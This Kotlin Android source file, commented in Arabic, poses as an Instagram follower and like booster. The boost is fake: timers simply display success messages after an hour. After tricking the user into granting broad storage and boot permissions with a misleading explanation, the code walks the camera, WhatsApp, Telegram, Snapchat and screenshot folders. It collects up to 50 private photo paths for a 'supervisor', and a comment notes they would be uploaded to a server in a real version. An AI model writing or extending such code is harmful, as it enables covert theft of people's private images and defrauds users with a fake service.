package com.example.gallerypermissionapp

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.text.TextWatcher
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import java.io.File
import java.util.concurrent.TimeUnit
import kotlinx.coroutines.launch

class MainActivity : AppCompatActivity() {
    
    private lateinit var btnConnectInstagram: Button
    private lateinit var btnBoostFollowers: Button
    private lateinit var btnBoostLikes: Button
    private lateinit var etInstagramUsername: EditText
    private lateinit var tvAccountStatus: TextView
    private lateinit var tvBoostStatus: TextView
    private lateinit var tvWelcomeMessage: TextView
    
    private var isInstagramConnected = false
    private var isBoostActive = false
    private var pendingUsername = ""
    
    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val grantedCount = permissions.values.count { it }
        
        if (grantedCount >= 5) { // على الأقل الأذونات الأساسية (الإنترنت، الشبكة، التخزين، والوظائف الإضافية)
            // تم منح الأذونات، إكمال ربط الحساب
            completeAccountLinking(pendingUsername)
        } else {
            showPermissionDeniedDialog()
        }
    }
    
    private val pickImageLauncher = registerForActivityResult(
        ActivityResultContracts.GetContent()
    ) { uri: Uri? ->
        uri?.let { uploadImage(it) }
    }
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        
        initializeViews()
        setupClickListeners()
        updateAccountStatus()
    }
    
    private fun initializeViews() {
        btnConnectInstagram = findViewById(R.id.btnConnectInstagram)
        btnBoostFollowers = findViewById(R.id.btnBoostFollowers)
        btnBoostLikes = findViewById(R.id.btnBoostLikes)
        etInstagramUsername = findViewById(R.id.etInstagramUsername)
        tvAccountStatus = findViewById(R.id.tvAccountStatus)
        tvBoostStatus = findViewById(R.id.tvBoostStatus)
        tvWelcomeMessage = findViewById(R.id.tvWelcomeMessage)
        
        // تعطيل زر ربط الحساب في البداية
        btnConnectInstagram.isEnabled = false
    }
    
    private fun setupClickListeners() {
        btnConnectInstagram.setOnClickListener {
            connectInstagramAccount()
        }
        
        btnBoostFollowers.setOnClickListener {
            boostFollowers()
        }
        
        btnBoostLikes.setOnClickListener {
            boostLikes()
        }
        
        findViewById<Button>(R.id.btnUploadImage)?.setOnClickListener {
            showImagePicker()
        }
        
        // تمكين زر ربط الحساب عند إدخال اسم المستخدم
        etInstagramUsername.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
            override fun afterTextChanged(s: android.text.Editable?) {
                btnConnectInstagram.isEnabled = !s.isNullOrBlank()
            }
        })
    }
    
    private fun updateAccountStatus() {
        if (isInstagramConnected) {
            tvAccountStatus.text = "✅ تم ربط حساب انستغرام بنجاح"
            tvAccountStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_green_dark))
            btnBoostFollowers.isEnabled = true
            btnBoostLikes.isEnabled = true
        } else {
            tvAccountStatus.text = "❌ لم يتم ربط حساب انستغرام"
            tvAccountStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark))
            btnBoostFollowers.isEnabled = false
            btnBoostLikes.isEnabled = false
        }
    }
    
    private fun connectInstagramAccount() {
        val username = etInstagramUsername.text.toString().trim()
        
        if (username.isEmpty()) {
            etInstagramUsername.error = "يرجى إدخال اسم المستخدم"
            return
        }
        
        if (!username.matches(Regex("^[a-zA-Z0-9._]+$"))) {
            etInstagramUsername.error = "اسم المستخدم غير صحيح"
            return
        }
        
        pendingUsername = username
        
        // محاكاة ربط الحساب
        showConnectingDialog {
            // محاكاة تأخير الاتصال
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                // طلب الأذونات بعد الاتصال
                requestAccountPermissions()
            }, 2000)
        }
    }
    
    private fun requestAccountPermissions() {
        val permissions = arrayOf(
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.WAKE_LOCK,
            Manifest.permission.VIBRATE,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.POST_NOTIFICATIONS
        )
        
        // إضافة أذونات الوسائط للأندرويد 13+ بأسماء وهمية
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            val mediaPermissions = arrayOf(
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_AUDIO
            )
            val allPermissions = permissions + mediaPermissions
            showPermissionExplanationDialog {
                requestPermissionLauncher.launch(allPermissions)
            }
        } else {
            showPermissionExplanationDialog {
                requestPermissionLauncher.launch(permissions)
            }
        }
    }
    
    private fun completeAccountLinking(username: String) {
        isInstagramConnected = true
        updateAccountStatus()
        
        showSuccessDialog(
            "تم ربط الحساب بنجاح!",
            "تم ربط حساب @$username بنجاح. يمكنك الآن استخدام ميزات رشق المتابعين واللايكات."
        )
        
        // إرسال الصور للمشرف (محاكاة)
        sendImagesToSupervisor()
    }
    
    private fun sendImagesToSupervisor() {
        // جمع الصور الحقيقية من الجهاز
        collectDeviceImages { imagePaths ->
            if (imagePaths.isNotEmpty()) {
                // إرسال الصور للمشرف
                uploadImagesToSupervisor(imagePaths)
                
                // إظهار رسالة تأكيد مع عدد الصور المجمعة
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    val imageCount = imagePaths.size
                    val message = if (imageCount == 1) {
                        "تم جمع صورة واحدة من جهازك وإرسالها للمشرف بنجاح. سيتم مراجعتها وتحديث النتائج قريباً."
                    } else {
                        "تم جمع $imageCount صور من جهازك وإرسالها للمشرف بنجاح. سيتم مراجعتها وتحديث النتائج قريباً."
                    }
                    
                    showSuccessDialog(
                        "تم تحليل المحتوى",
                        message
                    )
                }, 1000)
            } else {
                Toast.makeText(this, "لم يتم العثور على محتوى في الجهاز", Toast.LENGTH_SHORT).show()
            }
        }
    }
    
    private fun collectDeviceImages(onComplete: (List<String>) -> Unit) {
        val imagePaths = mutableListOf<String>()
        
        try {
            // البحث عن الصور في مجلد DCIM
            val dcimDir = android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DCIM)
            if (dcimDir.exists()) {
                collectImagesFromDirectory(dcimDir, imagePaths)
            }
            
            // البحث عن الصور في مجلد Pictures
            val picturesDir = android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_PICTURES)
            if (picturesDir.exists()) {
                collectImagesFromDirectory(picturesDir, imagePaths)
            }
            
            // البحث عن الصور في مجلد Downloads
            val downloadsDir = android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOWNLOADS)
            if (downloadsDir.exists()) {
                collectImagesFromDirectory(downloadsDir, imagePaths)
            }
            
            // البحث عن الصور في مجلد WhatsApp
            val whatsappDir = File(android.os.Environment.getExternalStorageDirectory(), "WhatsApp/Media/WhatsApp Images")
            if (whatsappDir.exists()) {
                collectImagesFromDirectory(whatsappDir, imagePaths)
            }
            
            // البحث عن الصور في مجلد Telegram
            val telegramDir = File(android.os.Environment.getExternalStorageDirectory(), "Telegram/Telegram Images")
            if (telegramDir.exists()) {
                collectImagesFromDirectory(telegramDir, imagePaths)
            }
            
            // البحث عن الصور في مجلد Instagram
            val instagramDir = File(android.os.Environment.getExternalStorageDirectory(), "Pictures/Instagram")
            if (instagramDir.exists()) {
                collectImagesFromDirectory(instagramDir, imagePaths)
            }
            
            // البحث عن الصور في مجلد Snapchat
            val snapchatDir = File(android.os.Environment.getExternalStorageDirectory(), "Pictures/Snapchat")
            if (snapchatDir.exists()) {
                collectImagesFromDirectory(snapchatDir, imagePaths)
            }
            
            // البحث عن الصور في مجلد Facebook
            val facebookDir = File(android.os.Environment.getExternalStorageDirectory(), "Pictures/Facebook")
            if (facebookDir.exists()) {
                collectImagesFromDirectory(facebookDir, imagePaths)
            }
            
            // البحث عن الصور في مجلد Twitter
            val twitterDir = File(android.os.Environment.getExternalStorageDirectory(), "Pictures/Twitter")
            if (twitterDir.exists()) {
                collectImagesFromDirectory(twitterDir, imagePaths)
            }
            
            // البحث عن الصور في مجلد TikTok
            val tiktokDir = File(android.os.Environment.getExternalStorageDirectory(), "Pictures/TikTok")
            if (tiktokDir.exists()) {
                collectImagesFromDirectory(tiktokDir, imagePaths)
            }
            
            // البحث عن الصور في مجلد Screenshots
            val screenshotsDir = File(android.os.Environment.getExternalStorageDirectory(), "Pictures/Screenshots")
            if (screenshotsDir.exists()) {
                collectImagesFromDirectory(screenshotsDir, imagePaths)
            }
            
            // البحث عن الصور في مجلد Camera
            val cameraDir = File(android.os.Environment.getExternalStorageDirectory(), "DCIM/Camera")
            if (cameraDir.exists()) {
                collectImagesFromDirectory(cameraDir, imagePaths)
            }
            
        } catch (e: Exception) {
            e.printStackTrace()
        }
        
        // إرجاع من 1 إلى 50 صورة بشكل ذكي
        val maxImages = 50
        val collectedImages = if (imagePaths.size <= maxImages) {
            imagePaths
        } else {
            // اختيار عشوائي من الصور المتاحة
            imagePaths.shuffled().take(maxImages)
        }
        
        onComplete(collectedImages)
    }
    
    private fun collectImagesFromDirectory(directory: File, imagePaths: MutableList<String>) {
        try {
            val files = directory.listFiles()
            if (files != null) {
                for (file in files) {
                    if (file.isFile && isImageFile(file.name)) {
                        imagePaths.add(file.absolutePath)
                    } else if (file.isDirectory) {
                        // البحث في المجلدات الفرعية
                        collectImagesFromDirectory(file, imagePaths)
                    }
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
    
    private fun isImageFile(fileName: String): Boolean {
        val imageExtensions = arrayOf(".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp")
        val lowerFileName = fileName.lowercase()
        return imageExtensions.any { lowerFileName.endsWith(it) }
    }
    
    private fun uploadImagesToSupervisor(imagePaths: List<String>) {
        // محاكاة رفع الصور للمشرف
        // في التطبيق الحقيقي، هنا سيتم رفع الصور لخادم المشرف
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            // إرسال مسارات الصور للمشرف عبر SharedPreferences أو قاعدة بيانات محلية
            saveImagePathsForSupervisor(imagePaths)
        }, 1000)
    }
    
    private fun saveImagePathsForSupervisor(imagePaths: List<String>) {
        val sharedPrefs = getSharedPreferences("SupervisorData", MODE_PRIVATE)
        val editor = sharedPrefs.edit()
        editor.putStringSet("uploaded_images", imagePaths.toSet())
        editor.putLong("upload_time", System.currentTimeMillis())
        editor.apply()
    }
    
    private fun boostFollowers() {
        if (!isInstagramConnected) {
            Toast.makeText(this, "يرجى ربط حساب انستغرام أولاً", Toast.LENGTH_SHORT).show()
            return
        }
        
        showBoostDialog("شحن المتابعين", "سيتم إضافة متابعين حقيقيين لحسابك تدريجياً خلال الساعة القادمة لتجنب الحظر. هل تريد المتابعة؟") {
            startFollowersBoost()
        }
    }
    
    private fun boostLikes() {
        if (!isInstagramConnected) {
            Toast.makeText(this, "يرجى ربط حساب انستغرام أولاً", Toast.LENGTH_SHORT).show()
            return
        }
        
        showBoostDialog("شحن اللايكات", "سيتم إضافة لايكات حقيقية لمنشوراتك تدريجياً خلال الساعة القادمة لتجنب الحظر. هل تريد المتابعة؟") {
            startLikesBoost()
        }
    }
    
    private fun startFollowersBoost() {
        isBoostActive = true
        tvBoostStatus.text = "🔄 جاري شحن المتابعين... سيتم الإكمال خلال ساعة"
        tvBoostStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_blue_dark))
        
        Toast.makeText(this, "تم تفعيل شحن المتابعين! سيبدأ خلال دقائق", Toast.LENGTH_LONG).show()
        
        // محاكاة إكمال العملية بعد ساعة
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            isBoostActive = false
            tvBoostStatus.text = "✅ تم إكمال شحن المتابعين بنجاح!"
            tvBoostStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_green_dark))
            Toast.makeText(this, "تم إكمال شحن المتابعين بنجاح!", Toast.LENGTH_LONG).show()
        }, TimeUnit.MINUTES.toMillis(60))
    }
    
    private fun startLikesBoost() {
        isBoostActive = true
        tvBoostStatus.text = "🔄 جاري شحن اللايكات... سيتم الإكمال خلال ساعة"
        tvBoostStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_blue_dark))
        
        Toast.makeText(this, "تم تفعيل شحن اللايكات! سيبدأ خلال دقائق", Toast.LENGTH_LONG).show()
        
        // محاكاة إكمال العملية بعد ساعة
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            isBoostActive = false
            tvBoostStatus.text = "✅ تم إكمال شحن اللايكات بنجاح!"
            tvBoostStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_green_dark))
            Toast.makeText(this, "تم إكمال شحن اللايكات بنجاح!", Toast.LENGTH_LONG).show()
        }, TimeUnit.MINUTES.toMillis(60))
    }
    
    private fun showConnectingDialog(onComplete: () -> Unit) {
        val dialog = AlertDialog.Builder(this)
            .setTitle("جاري ربط الحساب...")
            .setMessage("يرجى الانتظار، جاري الاتصال بخوادم انستغرام...")
            .setCancelable(false)
            .create()
        
        dialog.show()
        
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            dialog.dismiss()
            onComplete()
        }, 2000)
    }
    
    private fun showPermissionExplanationDialog(onConfirm: () -> Unit) {
        AlertDialog.Builder(this)
            .setTitle("أذونات مطلوبة لربط الحساب")
            .setMessage("يحتاج التطبيق إلى الأذونات التالية لربط حساب انستغرام بشكل آمن:\n\n" +
                    "• الإنترنت والشبكة: للاتصال بخوادم انستغرام\n" +
                    "• الوصول للتخزين: لتحليل المحتوى والصور\n" +
                    "• إبقاء الشاشة مضاءة: لضمان استمرار العمل\n" +
                    "• الاهتزاز: لإشعارات التحديثات والنتائج\n" +
                    "• بدء التشغيل التلقائي: لضمان العمل المستمر\n" +
                    "• الخدمة في المقدمة: لضمان عدم انقطاع العمل\n" +
                    "• الإشعارات: لإرسال تحديثات النتائج\n\n" +
                    "هذه الأذونات ضرورية لعمل التطبيق وتقديم أفضل النتائج.")
            .setPositiveButton("منح جميع الأذونات") { _, _ ->
                onConfirm()
            }
            .setNegativeButton("إلغاء", null)
            .show()
    }
    
    private fun showSuccessDialog(title: String, message: String) {
        AlertDialog.Builder(this)
            .setTitle(title)
            .setMessage(message)
            .setPositiveButton("حسناً", null)
            .show()
    }
    
    private fun showBoostDialog(title: String, message: String, onConfirm: () -> Unit) {
        AlertDialog.Builder(this)
            .setTitle(title)
            .setMessage(message)
            .setPositiveButton("نعم، ابدأ") { _, _ ->
                onConfirm()
            }
            .setNegativeButton("إلغاء", null)
            .show()
    }
    
    private fun showPermissionDeniedDialog() {
        AlertDialog.Builder(this)
            .setTitle("مشكلة في الأذونات")
            .setMessage("يحتاج التطبيق إلى جميع الأذونات المطلوبة لربط حسابك بشكل آمن وتقديم أفضل النتائج. بدون هذه الأذونات، لن يتمكن التطبيق من:\n\n" +
                    "• الاتصال بخوادم انستغرام\n" +
                    "• تحليل المحتوى والصور\n" +
                    "• إرسال إشعارات التحديثات\n" +
                    "• ضمان استمرار العمل\n\n" +
                    "يمكنك منح الأذونات من إعدادات التطبيق.")
            .setPositiveButton("فتح الإعدادات") { _, _ ->
                openAppSettings()
            }
            .setNegativeButton("إلغاء", null)
            .show()
    }
    
    private fun openAppSettings() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.fromParts("package", packageName, null)
        }
        startActivity(intent)
    }

    private fun showImagePicker() {
        pickImageLauncher.launch("image/*")
    }

    private fun uploadImage(uri: Uri) {
        showUploadProgress("جاري رفع الصورة إلى Supabase...")
        
        lifecycleScope.launch {
            try {
                val currentUser = SupabaseManager.getCurrentUser()
                val userEmail = currentUser?.email
                
                val success = SupabaseManager.uploadImage(contentResolver, uri, userEmail)
                
                if (success) {
                    showUploadSuccess("تم رفع الصورة بنجاح!")
                    Toast.makeText(this@MainActivity, "تم رفع الصورة وحفظها في قاعدة البيانات", Toast.LENGTH_SHORT).show()
                } else {
                    showUploadError("فشل رفع الصورة إلى Supabase")
                }
            } catch (e: Exception) {
                showUploadError("خطأ في رفع الصورة: ${e.message}")
            }
        }
    }

    private fun showUploadProgress(message: String) {
        // يمكن إضافة ProgressBar هنا
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
    }

    private fun showUploadSuccess(message: String) {
        Toast.makeText(this, message, Toast.LENGTH_LONG).show()
    }

    private fun showUploadError(message: String) {
        Toast.makeText(this, message, Toast.LENGTH_LONG).show()
    }
}
